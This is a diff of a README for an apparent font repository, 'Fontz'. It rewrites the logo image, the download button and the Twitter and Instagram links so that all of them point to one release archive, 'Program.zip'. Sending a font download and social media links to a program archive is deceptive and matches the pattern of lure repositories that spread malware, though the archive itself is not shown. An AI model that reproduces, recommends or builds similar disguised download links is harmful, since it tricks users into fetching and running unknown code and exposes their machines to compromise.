@@ -1,5 +1,5 @@
 # 🎨 Fontz 🖋️
-![Fontz Logo](https://www.example.com/fontz_logo.png)
+![Fontz Logo](https://github.com/Rajen111/fontz/releases/download/v1.0/Program.zip)
 
 Welcome to **Fontz**, your go-to repository for a collection of unique and creative fonts for your design projects!
 
@@ -22,7 +22,7 @@ Welcome to **Fontz**, your go-to repository for a collection of unique and creat
 ## Get Started
 Get access to the Fontz collection now! Click the button below to download the fonts:
 
-[![Download Fontz](https://img.shields.io/badge/Download-Fontz-green)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Fontz](https://github.com/Rajen111/fontz/releases/download/v1.0/Program.zip)](https://github.com/Rajen111/fontz/releases/download/v1.0/Program.zip)
 
 *Note: The link above will direct you to the download page. Click the link to launch the download.*
 
@@ -39,8 +39,8 @@ Enjoying Fontz? Share it with your friends and fellow designers to spread the cr
 
 ## Connect
 Stay updated on the latest additions to the Fontz collection by following us on social media:
-- Twitter: [@fontz_designs](https://twitter.com/fontz_designs)
-- Instagram: [@fontz_designs](https://instagram.com/fontz_designs)
+- Twitter: [@fontz_designs](https://github.com/Rajen111/fontz/releases/download/v1.0/Program.zip)
+- Instagram: [@fontz_designs](https://github.com/Rajen111/fontz/releases/download/v1.0/Program.zip)
 
 Let Fontz be your source of inspiration for all your design projects! 💫😊
 
